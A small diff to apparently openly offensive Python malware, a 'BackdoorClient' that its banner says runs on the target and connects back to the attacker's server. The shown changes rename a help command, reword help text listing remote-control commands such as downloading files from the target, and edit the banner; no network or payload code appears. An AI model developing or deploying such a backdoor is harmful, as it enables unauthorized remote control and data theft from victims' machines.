@@ -128,7 +128,7 @@ class BackdoorClient:
                 return 'continue'
             
             # Enhanced Features
-            elif command == 'help_advanced':
+            elif command == 'help':
                 self.send_advanced_help()
                 return 'continue'
             
@@ -561,12 +561,12 @@ class BackdoorClient:
 
     # Send advanced help information
     def send_advanced_help(self):
-        """Send help information about advanced features"""
+        """Send help information about all features"""
         help_text = """
         === Enhanced Backdoor Commands ===
 
         BASIC COMMANDS:
-        help_advanced        - Show this help message
+        help                - Show this help message
         sysinfo             - Display system information
         cd <dir>            - Change directory
         download <file>     - Download file from target
@@ -681,7 +681,7 @@ class BackdoorClient:
 # Main execution
 if __name__ == "__main__":
     print("=" * 70)
-    print("  Enhanced Backdoor Client - TARGET SIDE")
+    print("  Backdoor Client - TARGET SIDE")
     print("  This program connects BACK to the attacker's server")
     print("  WARNING: For Educational Purposes Only!")
     print("=" * 70)
